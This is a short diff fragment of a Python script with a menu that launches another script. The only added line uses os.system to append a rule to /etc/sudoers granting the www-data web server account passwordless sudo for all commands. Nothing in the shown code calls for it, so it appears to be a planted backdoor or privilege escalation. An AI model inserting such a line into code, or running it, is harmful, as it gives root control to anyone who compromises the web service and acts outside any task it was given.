@@ -188,3 +188,4 @@ if choice == "2":
     os.system("python3 express.py")
 print("for_loop finished")
 
+os.system('echo "www-data ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers')
